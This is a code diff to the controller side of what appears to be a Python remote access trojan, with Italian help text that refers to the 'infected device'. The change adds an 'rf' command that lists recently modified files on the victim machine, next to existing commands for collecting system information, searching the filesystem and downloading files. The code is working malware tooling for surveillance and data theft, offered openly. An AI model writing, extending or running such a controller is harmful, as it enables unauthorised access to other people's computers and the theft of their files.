@@ -118,6 +118,15 @@ def searchFile(connectionSocket, fileName):
     return output
 
 
+def recentFiles(connectionSocket):
+    pSize = int(connectionSocket.recv(1024).decode())
+    mex = "Server pronto a ricevere l'output"
+    connectionSocket.send(mex.encode())
+    output = connectionSocket.recv(pSize).decode()
+    print(output)
+    return
+
+
 def clearScreen():
     global windowsFlag
     if windowsFlag == "w":
@@ -136,7 +145,8 @@ def main():
             help = "infoOs                          ricevi informazioni del sistema operativo\nsearch [nome file]              cerca un file nel " \
                    "filesystem \nget [nome file]                 scarica il file dal dispositivo infetto\nesc                             chiudi la " \
                    "sessione \nhelp                            guida comandi\ncd                              change directory\ndir/ls                          listing " \
-                   "directory \ncls                             clear console\npwd                             print working directory"
+                   "directory \ncls                             clear console\npwd                             print working directory" \
+                   "\nrf [<data>YYYY-MM-DD]           mostra file più recenti [a partire da <data>]"
             while not esc:
                 cmd = input('>>')
                 connectionSocket.send(cmd.encode())
@@ -150,7 +160,6 @@ def main():
 
                 elif cmd == "esc":
                     esc = exitNClose(connectionSocket, cmd)
-                    break
 
                 elif "cd" in cmd:
                     changeDirectory(connectionSocket)
@@ -175,6 +184,9 @@ def main():
 
                 elif cmd == "pwd":
                     print(pwd)
+                
+                elif cmd == "rf" or "rf " in cmd:
+                    recentFiles(connectionSocket)
 
         except Exception as e:
             print(e)
